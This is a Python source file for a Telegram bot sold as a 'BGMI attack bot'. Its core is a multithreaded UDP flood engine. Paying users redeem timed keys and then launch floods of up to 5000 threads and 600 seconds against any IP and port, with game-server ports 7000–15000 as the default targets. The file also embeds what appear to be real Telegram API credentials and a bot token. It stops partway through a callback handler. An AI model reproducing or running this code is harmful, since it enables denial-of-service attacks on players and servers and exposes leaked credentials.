#!/usr/bin/env python3
"""
💎 ULTIMATE PREMIUM BGMI ATTACK BOT 💎
Auto Key Gen | History | Live Status | Premium UI
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
OWNER_ID = 1987818347
OWNER_USERNAME = "BESTCHEAT_OWNER"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600

# ═══════════════ TRACKING ═══════════════
used_videos = []
pending_add_video = set()
pending_del_video = set()

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA", "NITRO"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "_**EXPIRED**_", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        if days > 30: return f"_{days//30}M+_", False
        elif days > 0: return f"_{days}D {hours}H_", False
        elif hours > 0: return f"_{hours}H {minutes}M_", False
        else: return f"_{minutes}M_", False
    except: return "_**ERROR**_", False

def get_time():
    return datetime.now(IST).strftime("%I:%M %p")

def tstr(s):
    if s < 60: return f"{int(s)}s"
    m, sec = int(s//60), int(s%60)
    return f"{m}m {sec}s" if s < 3600 else f"{int(s//3600)}h {int((s%3600)//60)}m"

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path), "added": datetime.now(IST).isoformat()})
    jsave(VIDEO_DB, vids)
    return vid
def rand_vid():
    global used_videos
    vids = get_vids()
    if not vids: return None
    avail = [v for v in vids if v["id"] not in used_videos]
    if not avail: used_videos.clear(); avail = vids
    v = random.choice(avail); used_videos.append(v["id"])
    return v
def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False
def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()
def block_user(uid):
    b = get_blocked()
    if str(uid) not in b: b.append(str(uid)); jsave(BLOCKED_DB, b); return True
    return False
def unblock_user(uid):
    b = get_blocked()
    if str(uid) in b: b.remove(str(uid)); jsave(BLOCKED_DB, b); return True
    return False

def check_access(uid):
    if is_blocked(uid): return False, "_**BLOCKED**_"
    if uid == OWNER_ID: return True, "_**OWNER**_"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "_**PREMIUM**_"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"_**KEY ({r})**_"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "_**NONE**_"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("_**KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)
    return True

def remove_expired():
    u = get_users()
    removed = 0
    if "keys" in u:
        exp = []
        for uid, data in u["keys"].items():
            try:
                if datetime.now(IST) >= datetime.fromisoformat(data["expiry"]): exp.append(uid)
            except: exp.append(uid)
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY FUNCTIONS ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    uid_str = str(uid)
    if uid_str not in h: h[uid_str] = []
    h[uid_str].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[uid_str]) > 50: h[uid_str] = h[uid_str][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    h = get_history()
    return h.get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, "❌ Invalid time!"
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "used_at": None, "active": True, "blocked": False}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "❌ **INVALID KEY!**"
    key = keys[key_code]
    if key.get("blocked"): return False, "🚫 **KEY BLOCKED!**"
    if not key["active"]: return False, "❌ **KEY USED!**"
    if key["used_by"]: return False, "❌ **ALREADY REDEEMED!**"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"Key: {key_code[:15]}... | {key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("ultimate_final_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ KEYBOARDS ═══════════════
def user_main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 _**ATTACK**_", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ _**STOP**_", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 _**STATUS**_", callback_data="status_btn"),
         InlineKeyboardButton("ℹ️ _**INFO**_", callback_data="info_menu")],
        [InlineKeyboardButton("🔑 _**REDEEM KEY**_", callback_data="redeem_menu")],
    ])

def owner_main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 _**ATTACK**_", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ _**STOP**_", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 _**STATUS**_", callback_data="status_btn"),
         InlineKeyboardButton("ℹ️ _**INFO**_", callback_data="info_menu")],
        [InlineKeyboardButton("🔑 _**REDEEM KEY**_", callback_data="redeem_menu")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🎬 _**VIDEO MANAGER**_", callback_data="video_menu")],
        [InlineKeyboardButton("👑 _**ADMIN PANEL**_", callback_data="admin_menu")],
    ])

def auto_gen_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 _**20 Minute**_ 🔓", callback_data="autokey_20m"),
         InlineKeyboardButton("🔑 _**40 Minute**_ 🔓", callback_data="autokey_40m"),
         InlineKeyboardButton("🔑 _**60 Minute**_ 🔓", callback_data="autokey_60m")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🗝️ _**1 Day**_ 🔐", callback_data="autokey_1d"),
         InlineKeyboardButton("🗝️ _**3 Day**_ 🔐", callback_data="autokey_3d"),
         InlineKeyboardButton("🗝️ _**7 Day**_ 🔐", callback_data="autokey_7d")],
        [InlineKeyboardButton("🗝️ _**15 Day**_ 🔐", callback_data="autokey_15d"),
         InlineKeyboardButton("🗝️ _**23 Day**_ 🔐", callback_data="autokey_23d"),
         InlineKeyboardButton("🗝️ _**30 Day**_ 🔐", callback_data="autokey_30d")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🪪 _**1 Month**_ 🫆", callback_data="autokey_1mo"),
         InlineKeyboardButton("🪪 _**2 Month**_ 🫆", callback_data="autokey_2mo"),
         InlineKeyboardButton("🪪 _**3 Month**_ 🫆", callback_data="autokey_3mo")],
        [InlineKeyboardButton("🔙 _**BACK**_", callback_data="back_admin")],
    ])

def video_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 _**ADD VIDEO**_", callback_data="add_video_btn")],
        [InlineKeyboardButton("🗑️ _**DELETE VIDEO**_", callback_data="del_video_btn")],
        [InlineKeyboardButton("🧹 _**CLEAR ALL VIDEOS**_", callback_data="clear_videos_btn")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 _**LIST VIDEOS**_", callback_data="list_videos")],
        [InlineKeyboardButton("ℹ️ _**VIDEO HELP**_", callback_data="video_help")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 _**BACK**_", callback_data="back_admin")],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🪪 _**ADD KEY**_", callback_data="add_key_popup")],
        [InlineKeyboardButton("🤖 _**AUTO GEN KEY**_", callback_data="auto_gen_key")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 _**ALL KEYS**_", callback_data="all_keys")],
        [InlineKeyboardButton("📊 _**STATS**_", callback_data="stats_btn")],
        [InlineKeyboardButton("🔄 _**CLEAR EXPIRED**_", callback_data="clear_expired")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 _**BACK**_", callback_data="back")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 _**BACK**_", callback_data="back")]])

def back_admin_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 _**BACK**_", callback_data="back_admin")]])

# ═══════════════ SEND WITH VIDEO ═══════════════
async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ START COMMAND ═══════════════
@app.on_message(filters.command("start"))
async def start_cmd(client, msg):
    uid = msg.from_user.id; user = msg.from_user
    access, a_type = check_access(uid)
    
    if not access:
        vid = rand_vid()
        text = f"""
╔══════════════════════════════╗
║  🛡️ _**PREMIUM PROTECTION**_  ║
╠══════════════════════════════╣
║  👤 _**{user.first_name}**_    ║
║  🔒 _**ACCESS DENIED!**_       ║
║                              ║
║  💎 _**PREMIUM ONLY**_         ║
║  🔑 _**Use Key to Unlock**_    ║
║                              ║
║  📲 _**Contact Father**_       ║
╚══════════════════════════════╝
"""
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 _**REDEEM KEY**_", callback_data="redeem_popup")],
            [InlineKeyboardButton("📲 _**Contact-FaThEr**_", url=f"https://t.me/{OWNER_USERNAME}")],
        ])
        await send_vid(msg.chat.id, text, kb, vid)
        return
    
    info = get_user_info(uid)
    vid = rand_vid()
    kb = owner_main_kb() if uid == OWNER_ID else user_main_kb()
    
    expiry_text = ""
    if info.get("remaining"): expiry_text += f"\n⏳ _**Remaining:**_ `{info['remaining']}`"
    if info.get("expiry"):
        try:
            exp = datetime.fromisoformat(info["expiry"])
            expiry_text += f"\n📅 _**Expires:**_ `{exp.strftime('%d %b %Y, %I:%M %p')}`"
        except: pass
    
    text = f"""
💎 _**PREMIUM BGMI ATTACK BOT**_ 💎

{LINE}
👤 _**{user.first_name}**_
🆔 `{uid}`
💳 {a_type}{expiry_text}
{LINE}
⚡ `{info['threads']}` _**Threads**_
⏱️ `{info['max_time']}s` _**Max Time**_
📹 `{len(get_vids())}` _**Videos**_
{LINE}
⚔️ `/attack IP PORT TIME`
📋 `/attack 1.2.3.4 8080 120`
🎮 _**BGMI Ports:** 7000-15000_
{LINE}

🔽 _**SELECT OPTION:**_
"""
    await send_vid(msg.chat.id, text, kb, vid)

# ═══════════════ REDEEM COMMAND ═══════════════
@app.on_message(filters.command("redeem"))
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    access, a_type = check_access(uid)
    if access:
        info = get_user_info(uid)
        return await msg.reply_text(f"✅ _**ALREADY UNLOCKED!**_\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /start for menu")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(f"🔑 _**REDEEM KEY**_\n\n{LINE}\n📋 `/redeem KEY`\n🔑 `/redeem BGMI-XXXX-XXXX-XXXX`\n{LINE}\n📲 @{OWNER_USERNAME}")
    
    key = parts[1].upper()
    success, result = redeem_key_code(key, uid)
    
    if success:
        vid = rand_vid()
        text = f"""
🎉 _**KEY REDEEMED SUCCESSFULLY!**_

{LINE}
🔑 _**Key:**_ `{key[:20]}...`
📅 _**Expires:**_ `{result}`
{LINE}

🔓 _**You now have full access!**_
📋 Send `/start` to begin
"""
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text(f"{result}\n\n📲 @{OWNER_USERNAME}")

# ═══════════════ ATTACK COMMAND ═══════════════
@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg, attack_user
    uid = msg.from_user.id
    
    access, a_type = check_access(uid)
    if not access:
        vid = rand_vid()
        return await send_vid(msg.chat.id, f"╔══════════════════════════════╗\n║  🛡️ _**PREMIUM PROTECTION**_  ║\n╠══════════════════════════════╣\n║  👤 _**{msg.from_user.first_name}**_    ║\n║  🔒 _**ACCESS DENIED!**_       ║\n║                              ║\n║  💎 _**PREMIUM ONLY**_         ║\n║  🔑 _**Use Key to Unlock**_    ║\n║                              ║\n║  📲 _**Contact Father**_       ║\n╚══════════════════════════════╝", None, vid)
    
    if attacking:
        e = time.time() - ainfo['start']
        return await msg.reply_text(f"⚠️ _**Already attacking!**_ {int(e)}s\n🛑 Use Stop button")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ `/attack IP PORT TIME`\n📋 `/attack 1.2.3.4 8080 120`")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ _**Invalid port!**_")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ _**Invalid time!**_")
    
    info = get_user_info(uid)
    threads = info['threads']; max_t = info['max_time']
    if dur > max_t: dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True; attack_user = uid
    
    vid = rand_vid()
    text = f"💀 _**ATTACK LAUNCHED!**_\n\n🎯 `{ip}:{port}`\n⏱️ `{dur}s`\n🧵 `{threads}` _**Threads**_"
    amsg = await send_vid(msg.chat.id, text, None, vid)
    add_history(uid, "ATTACK_START", f"{ip}:{port} | {dur}s | {threads} threads")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(1.5)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                await amsg.edit_text(
                    f"💀 _**ATTACKING!**_\n\n"
                    f"🎯 `{ip}:{port}`\n"
                    f"⏱️ `{int(e)}s` / `{dur}s`\n"
                    f"[{bar}] `{pct:.0f}%`\n"
                    f"📦 `{attacker.pkts:,}` _**pkts**_\n"
                    f"📶 `{mbps:.1f}` _**Mbps**_\n\n"
                    f"🛑 _**Use Stop button**_"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False; attack_user = None
    
    add_history(uid, "ATTACK_END", f"{ip}:{port} | {stats['pkts']:,} pkts | {stats['mbps']:.1f} Mbps")
    
    vid = rand_vid()
    done = f"✅ _**ATTACK COMPLETED!**_\n\n🎯 `{ip}:{port}`\n📦 `{stats['pkts']:,}` _**pkts**_\n📶 `{stats['mbps']:.1f}` _**Mbps**_\n\n🔄 `/attack IP PORT TIME`"
    if vid and os.path.exists(vid["path"]): await app.send_video(msg.chat.id, vid["path"], caption=done)
    try: await amsg.edit_text(done)
    except: pass

# ═══════════════ STOP - AUTO SEND ═══════════════
@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        attacker.on = False; attacking = False
        vid = rand_vid()
        text = f"⛔ _**ATTACK STOPPED!**_\n\n📦 `{attacker.pkts:,}` _**packets sent**_\n\n🔄 `/attack IP PORT TIME`"
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text("💤 _**No attack running!**_")

# ═══════════════ STATUS ═══════════════
@app.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        e = time.time() - ainfo['start']
        mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
        await msg.reply_text(f"🟢 _**ATTACKING!**_\n\n⏱️ `{int(e)}s`\n📦 `{attacker.pkts:,}` _**pkts**_\n📶 `{mbps:.1f}` _**Mbps**_")
    else:
        await msg.reply_text("💤 _**IDLE**_\n\n⚔️ `/attack IP PORT TIME`")

# ═══════════════ VIDEO HANDLERS ═══════════════
@app.on_message(filters.command("addvideo"))
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("⏳ _**Downloading...**_")
        try:
            path = await msg.reply_to_message.download()
            vid = add_vid(path)
            text = f"""
✅ _**VIDEO ADDED SUCCESSFULLY!**_ ✅

{LINE}
🆔 _**Video ID:**_ `{vid}`
📁 _**Name:**_ `{os.path.basename(path)[:30]}`
📹 _**Total Videos:**_ `{len(get_vids())}`
{LINE}

🎲 _**Video will play randomly!**_
📋 `/videos` to see all videos
"""
            await s.edit_text(text, reply_markup=video_menu_kb())
        except Exception as e:
            await s.edit_text(f"❌ _**Error:**_ {e}")
    else:
        await msg.reply_text("❌ _**Reply to a video!**_")

@app.on_message(filters.command("videos"))
async def list_vids_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    vids = get_vids()
    if not vids: return await msg.reply_text("📹 _**No videos!**_")
    text = f"📹 _**Videos ({len(vids)}):**_\n\n"
    for v in vids[:15]: text += f"#{v['id']} `{v['name'][:30]}`\n"
    await msg.reply_text(text)

@app.on_message(filters.command("delvideo"))
async def del_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("❌ `/delvideo ID`")
    try:
        if del_vid(int(parts[1])):
            await msg.reply_text(f"✅ _**Video #{parts[1]} deleted!**_\n📹 Remaining: `{len(get_vids())}`")
        else:
            await msg.reply_text("❌ _**Not found!**_")
    except:
        await msg.reply_text("❌ _**Invalid ID!**_")

@app.on_message(filters.command("clearvideos"))
async def clear_vids_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    n = clear_vids()
    await msg.reply_text(f"🗑️ _**{n} videos cleared!**_")

# ═══════════════ CALLBACKS ═══════════════
@app.on_callback_query()
async def callbacks(client, cb: CallbackQuery):
    data = cb.data; uid = cb.from_user.id
    await cb.answer()
    
    # ═══════════ REDEEM POPUP ═══════════
    if data == "redeem_popup":
        await cb.answer(
            "🔑 _**HOW TO REDEEM KEY?**_\n\n"
            "1️⃣ Get key from admin\n"
            f"📲 @{OWNER_USERNAME}\n\n"
            "2️⃣ Use command:\n"
            "/redeem YOUR_KEY\n\n"
            "3️⃣ Example:\n"
            "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
            "💡 Key Format:\n"
            "BGMI-XXXX-XXXX-XXXXXXXX\n\n"
            "⏱️ Durations:\n"
            "30m, 24h, 7d, 2w, 1mo",
            show_alert=True
        )
        return
    
    # ═══════════ SEPARATOR ═══════════
    if data == "sep":
        return
    
    # ═══════════ BACK ═══════════
    if data == "back":
        await start_cmd(client, cb.message)
        try: await cb.message.delete()
        except: pass
        return
    
    if data == "back_admin":
        if uid != OWNER_ID: return
        await cb.message.edit_text(
            f"👑 _**ADMIN PANEL**_\n\n{LINE}\n🔽 Select:",
            reply_markup=admin_kb()
        )
        return
    
    # ═══════════ STOP ATTACK ═══════════
    if data == "stop_attack":
        global attacking
        if attacking and (uid == attack_user or uid == OWNER_ID):
            attacker.on = False; attacking = False
            vid = rand_vid()
            text = f"⛔ _**ATTACK STOPPED!**_\n\n📦 `{attacker.pkts:,}` _**packets**_\n\n🔄 `/attack IP PORT TIME`"
            await send_vid(cb.message.chat.id, text, None, vid)
            try: await cb.message.delete()
            except: pass
        else:
            await cb.answer("💤 _**No attack running!**_", show_alert=True)
        return
    
    # ═══════════ STATUS ═══════════
    if data == "status_btn":
        if attacking:
            e = time.time() - ainfo['start']
            await cb.answer(f"🟢 _**ATTACKING!**_\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts", show_alert=True)
        else:
            await cb.answer("💤 _**IDLE**_", show_alert=True)
        return
    
    # ═══════════ ATTACK MENU ═══════════
    if data == "attack_menu":
        info = get_user_info(uid)
        await cb.message.edit_text(
            f"💀 _**ATTACK MENU**_\n\n{LINE}\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"📋 `/attack 1.2.3.4 8080 120`\n"
            f"{LINE}\n"
            f"🎮 _**BGMI:** 7000-15000_\n"
            f"⚡ `{info['threads']}` _**Threads**_\n"
            f"⏱️ `{info['max_time']}s` _**Max**_",
            reply_markup=back_kb()
        )
        return
    
    # ═══════════ INFO / HISTORY ═══════════
    if data == "info_menu":
        info = get_user_info(uid)
        history = get_user_history(uid)
        
        text = f"ℹ️ _**USER INFO**_\n\n{LINE}\n"
        text += f"👤 _**{cb.from_user.first_name}**_\n"
        text += f"🆔 `{uid}`\n"
        text += f"💳 {info['type']}\n"
        
        if info.get("remaining"):
            text += f"⏳ _**Remaining:**_ `{info['remaining']}`\n"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                text += f"📅 _**Expires:**_ `{exp.strftime('%d %b, %I:%M %p')}`\n"
            except: pass
        
        text += f"\n{LINE}\n📊 _**ATTACK HISTORY:**_\n"
        
        if history:
            for h in history[-5:]:
                try:
                    t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                    text += f"• `{t}` - {h['action']}\n  _{h['details'][:40]}_\n"
                except: pass
        else:
            text += "• _**No attacks yet!**_\n"
        
        text += f"\n{LINE}\n📹 _**Videos:**_ `{len(get_vids())}`"
        
        await cb.message.edit_text(text, reply_markup=back_kb())
        return
    
    # ═══════════ REDEEM MENU ═══════════
    if data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(
                f"✅ _**ACCESS ACTIVE!**_\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /attack to start!",
                reply_markup=back_kb()
            )
        else:
            await cb.message.edit_text(
                f"🔑 _**REDEEM KEY**_\n\n{LINE}\n"
                f"📋 `/redeem KEY`\n"
                f"🔑 `/redeem BGMI-XXXX-XXXX-XXXX`\n"
                f"{LINE}\n📲 @{OWNER_USERNAME}\n\n"
                f"⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔑 _**HOW TO REDEEM**_", callback_data="redeem_popup")],
                    [InlineKeyboardButton("📲 _**Contact-FaThEr**_", url=f"https://t.me/{OWNER_USERNAME}")],
                    [InlineKeyboardButton("🔙 _**BACK**_", callback_data="back")],
                ])
            )
        return
    
    # ═══════════ VIDEO MENU ═══════════
    if data == "video_menu":
        if uid != OWNER_ID: await cb.answer("_**Owner only!**_", show_alert=True); return
        await cb.message.edit_text(
            f"🎬 _**VIDEO MANAGER**_\n\n{LINE}\n"
            f"📹 _**Total:**_ `{len(get_vids())}`\n"
            f"{LINE}\n🔽 Select:",
            reply_markup=video_menu_kb()
        )
        return
    
    if data == "add_video_btn":
        if uid != OWNER_ID: return
        await cb.message.edit_text(
            "📤 _**ADD VIDEO**_\n\n"
            "Reply to a video with `/addvideo`\n\n"
            "Or send `/addvideo` command!",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "del_video_btn":
        if uid != OWNER_ID: return
        await cb.message.edit_text(
            "🗑️ _**DELETE VIDEO**_\n\n"
            "Use: `/delvideo ID`\n"
            "Example: `/delvideo 3`\n\n"
            "📋 `/videos` to see IDs",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "clear_videos_btn":
        if uid != OWNER_ID: return
        n = clear_vids()
        await cb.message.edit_text(
            f"🗑️ _**{n} videos cleared!**_",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "list_videos":
        vids = get_vids()
        if not vids:
            await cb.message.edit_text("📹 _**No videos!**_", reply_markup=back_admin_kb())
        else:
            text = f"📹 _**Videos ({len(vids)}):**_\n\n"
            for v in vids[:15]: text += f"#{v['id']} `{v['name'][:30]}`\n"
            await cb.message.edit_text(text, reply_markup=back_admin_kb())
        return
    
    if data == "video_help":
        await cb.message.edit_text(
            f"ℹ️ _**VIDEO HELP**_\n\n{LINE}\n"
            f"📤 _**Add:**_ Reply to video + `/addvideo`\n"
            f"📋 _**List:**_ `/videos`\n"
            f"🗑️ _**Delete:**_ `/delvideo ID`\n"
